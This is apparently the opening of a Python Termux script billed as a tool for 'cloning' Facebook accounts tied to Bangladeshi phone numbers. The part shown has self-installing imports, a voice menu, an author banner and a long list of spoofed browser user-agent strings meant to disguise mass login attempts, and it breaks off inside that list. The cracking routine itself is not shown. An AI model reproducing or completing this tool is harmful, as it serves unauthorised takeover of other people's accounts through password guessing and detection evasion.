#_____This tool is code by EMRAN CYBER KING

#____It'z 6 to 11 digit Bd Number Cloneing 

import os,sys,time,json,random,re,string,platform,base64,uuid,zlib

from os import system as _EMRAN_

_EMRAN_("pkg install play-audio")

try:

    import bs4

except ModuleNotFoundError:

    _EMRAN_('pip install bs4')

    import bs4

try:

    import gtts

except ModuleNotFoundError:

    _EMRAN_('pip install gtts')

    import gtts

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

from concurrent.futures import ThreadPoolExecutor

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import requests as ress

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    _EMRAN_('pip install requests')

    import requests

try:

    import mechanize

except ModuleNotFoundError:

    _EMRAN_('pip install mechanize')

    import mechanize

def create_audio(text,file):

    from gtts import gTTS

    my_a = gTTS(text)

    my_a.save(file)

def emran(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

 ######[PLAY_AUDIO]#####

def play_audio(audio_file):

    from os import system as cmd

    try:

        cmd("play-audio "+audio_file)

    except:

        pass

def logo():

    color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])

    print(f"""\n\033[1;90m

    \033[38;5;46m╔═════════════════════════════════════╗

    \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔═══════════╗ \x1b[38;5;196m╔════════╗ ║

    \033[38;5;46m║ ║\033[38;5;46m███    ███ ║ \033[38;5;46m║\x1b[38;5;196m█████ ║ \033[38;5;46m║\033[38;5;46m    ████████  ║ ║

    \033[38;5;46m║ ║\033[38;5;46m████   ██      ║ \033[38;5;46m║\x1b[38;5;196m██   ██ ║ \033[38;5;46m║\033[38;5;46m██        ██ ║ ║

    \033[38;5;46m║ ║\033[38;5;46m██ ██  ██  ║ \033[38;5;46m║\x1b[38;5;196m███████ ║ \033[38;5;46m║\033[38;5;46m       ███████  ║ ║

    \033[38;5;46m║ ║\033[38;5;46m██  ██ ██      ║ \033[38;5;46m║\x1b[38;5;196m██   ██ ║ \033[38;5;46m║\033[38;5;46m       ██ ██ ║ ║

    \033[38;5;46m║ ║\033[38;5;46m██   ████ ║ \033[38;5;46m║\x1b[38;5;196m██   ██ ║ \033[38;5;46m║\033[38;5;46m       ███████ ║ ║

    \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚═══════════╝ \033[38;5;46m╚════════╝ ║

    \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔══════════╗             ║

    \033[38;5;46m║ ║ \033[30;1m█████  ║ \033[38;5;46m║\x1b[38;5;196m███    ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝║

    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m████   ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝║

    \033[38;5;46m║ ║\033[30;1m███████ ║ \033[38;5;46m║\x1b[38;5;196m██ ██  ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝║

    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m██  ██ ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝║

    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m██   ████ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠𝄟⃝║

    \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚══════════╝             ║ 

    \033[38;5;46m╚═════════════════════════════════════╝

\033[38;5;46m╔══════════════╗  \033[38;5;46m╔══════════════════════════╗

\033[38;5;46m║\033[38;5;46m╔═══════════╗ ║  \033[38;5;46m║\033[38;5;46m╔══════╗\033[38;5;46m╔══════╗          ║

\033[38;5;46m║\033[38;5;46m║𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗜𝗡𝗚║ ║  \033[38;5;46m║\033[38;5;46m║𝗔𝗨𝗧𝗛𝗢𝗥║\033[38;5;46m║𝗡𝗔𝗦𝗜𝗠║          ║      

\033[38;5;46m║\033[38;5;46m╚═══════════╝ ║  \033[38;5;46m║\033[38;5;46m╚══════╝\033[38;5;46m╚══════╝          ║

\033[38;5;46m║\033[38;5;46m╔══════╗      ║  \033[38;5;46m║\033[38;5;46m╔══════╗\033[38;5;46m╔════════════╗    ║

\033[38;5;46m║\033[38;5;46m║𝗣𝗬𝗧𝗛𝗢𝗡║      ║  \033[38;5;46m║\033[38;5;46m║𝗚𝗜𝗧𝗛𝗨𝗕║\033[38;5;46m║𝗠𝗔𝗫 𝗙𝗥𝗢 𝗠𝗔𝗡 ║    ║     

\033[38;5;46m║\033[38;5;46m╚══════╝      ║  \033[38;5;46m║\033[38;5;46m╚══════╝\033[38;5;46m╚════════════╝    ║

\033[38;5;46m║\033[38;5;46m╔════════╗    ║  \033[38;5;46m║\033[38;5;46m╔════════╗\033[38;5;46m╔═════════════╗ ║

\033[38;5;46m║\033[38;5;46m║𝗧𝗘𝗥𝗠𝗨𝗫  ║    ║  \033[38;5;46m║\033[38;5;46m║𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞║\033[38;5;46m║𝗡𝗔𝗦𝗜𝗠 𝗛𝗢𝗦𝗦𝗔𝗜𝗡║ ║

\033[38;5;46m║\033[38;5;46m╚════════╝    ║  \033[38;5;46m║\033[38;5;46m╚════════╝\033[38;5;46m╚═════════════╝ ║

\033[38;5;46m║\033[38;5;46m╔══════════╗  ║  \033[38;5;46m║\033[38;5;46m╔════════╗\033[38;5;46m╔═════════════╗ ║

\033[38;5;46m║\033[38;5;46m║𝗞𝗔𝗟𝗜 𝗟𝗜𝗡𝗨𝗫║  ║  \033[38;5;46m║\033[38;5;46m║𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠║\033[38;5;46m║01768576918║ ║

\033[38;5;46m║\033[38;5;46m╚══════════╝  ║  \033[38;5;46m║\033[38;5;46m╚════════╝\033[38;5;46m╚═════════════╝ ║

\033[38;5;46m║\033[38;5;46m╔══════════╗  ║  \033[38;5;46m║\033[38;5;46m╔════════╗\033[38;5;46m╔═════════════╗ ║

\033[38;5;46m║\033[38;5;46m║𝗖+ 𝗛𝗔𝗖𝗞𝗜𝗡𝗚║  ║  \033[38;5;46m║\033[38;5;46m║𝗪𝗛𝗔𝗧𝗛𝗔𝗣𝗣║\033[38;5;46m║01768576918║ ║     

\033[38;5;46m║\033[38;5;46m╚══════════╝  ║  \033[38;5;46m║\033[38;5;46m╚════════╝\033[38;5;46m╚═════════════╝ ║

\033[38;5;46m╚══════════════╝  \033[38;5;46m╚══════════════════════════╝\033[00m\033[1;30m""")

def EMRAN():

    _EMRAN_('clear')

    logo()

    print("")

    print('\033[1;90m╔══[\033[1;91m\033[47m01\x1b[0m\033[1;90m] \033[1;97m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 𝑪𝑹𝑨𝑪𝑲  ')

    print('\033[1;90m╠══[\033[1;92m\033[47m02\x1b[0m\033[1;90m] \033[1;97m𝑭𝒐𝒓 𝑴𝒐𝒓𝒆 𝑻𝒐𝒐𝒍')

    print('\033[1;90m╠══[\033[1;93m\033[47m03\x1b[0m\033[1;90m] \033[1;97m𝑭𝒐𝒍𝒍𝒐𝒘 𝑴𝒚 𝑮𝒓𝒐𝒖𝒑')

    print('\033[1;90m╚══[\033[1;90m\033[47m00\x1b[0m\033[1;90m]\033[1;94m 𝑬𝒙𝒊𝒕')

    create_audio("Hi sir ,I am love bary,choose 1 for 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 crack","test.mp3")

    play_audio("test.mp3")

    opt = input('\n\x1b[1;32m╠ 𝑪𝑯𝑶𝑶𝑺𝑬_\033[1;91m: \033[1;31m')

    if opt in ["1","01"]:

        _EMRAN_("xdg-open https://github.com/Emran-cyber99487")

        create_audio("Starting 🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗡𝗔𝗦𝗜𝗠 crack ,I love you","test2.mp3")

        play_audio("test2.mp3")

        menu()

    if opt in ["2","02"]:

        create_audio("Follow our group sir","test3.mp3")

        play_audio("test3.mp3")

        _EMRAN_('xdg-open https://github.com/Emran-cyber99487')

    if opt in["3","03"]:

        create_audio("Follow our group sir","tes3.mp3")

        play_audio("tes3.mp3")

        

        _EMRAN_('xdg-open https://github.com/Emran-cyber99487')

    if opt in["0","00"]:

        

        

        create_audio("good bye my boss ,I love you","test4.mp3")

        play_audio("test4.mp3")

        sys.exit()

        

    if opt not in ['h','H','r','R','O','o','n','N','e','E','1','2','3','4','5','01','02','03','04','0','6','06','00']:

        create_audio("choose the rigth option ","test5.mp3")

        play_audio("test5.mp3")

        EMRAN()

#############

oks=[]

cps=[]

loop = 0

mahi_agent=['Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L523T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4782.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M349Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4755.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S840H) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4283.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J425L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4552.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B975X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4251.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P472Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4861.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q844J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4682.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q722F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4880.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B779Z) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4882.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K782V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4655.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L965Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4386.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O868O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4210.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D432P) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4221.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C63T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4801.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S815O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4727.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A669J) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4868.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y536Z) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4893.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y610J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y907L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4684.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J775N) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4760.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R132G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4247.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y278P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4789.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N344N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4220.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A741P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4688.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z235C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4616.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K314J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4387.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D553Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4594.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N569N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4885.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S335R) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4319.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S102C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4624.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E473M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4362.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L431O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4416.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W337Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4598.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S680Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4370.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q341X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4444.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q123K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4339.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F702H) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4886.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C346X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W907P) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4272.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S675P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4875.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S242A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4746.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D125S) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O690L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4827.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T191S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4757.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H70Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4544.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J758G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4422.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M860R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4594.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q194M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4889.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y170X) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4817.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A706W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4405.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I883A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D264R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4466.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S583I) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4853.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C449R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4637.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J908A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4667.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U921A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4760.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L525A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4418.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K497Y) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4518.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I301P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4427.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A352M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4423.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A684P) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L679E) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4509.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F745Y) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C46A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4215.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F376J) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4763.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M790H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4533.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F824J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4553.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J126J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4348.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q27V) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4315.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J770M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T317O) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4471.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W251T) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4363.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z842Q) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4667.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E687O) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4677.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y105Q) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4862.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J638X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4830.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B824Q) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4439.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z700L) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4549.126 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N835S) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4860.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K984C) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4670.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P859W) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4726.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E558C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4834.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O688U) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4511.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N152B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4723.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I616F) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4846.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C895F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4831.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J621R) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4830.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C579H) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4388.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R678N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4283.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A151H) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4569.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G548U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4690.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K471F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4211.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C754S) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4225.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C611Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4897.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q71F) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4328.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R23X) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4457.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A73A) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4886.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L585T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4885.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V27D) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4250.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K796V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4283.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)L533C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4641.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D467A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4771.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J178P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4605.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W937L) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4761.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O334E) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4701.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P437P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C565Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4555.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N507A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4305.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M153B) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4401.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I886K) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4616.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J288S) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4897.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y442L) AppleWebKit/537.36 (KHTML, like 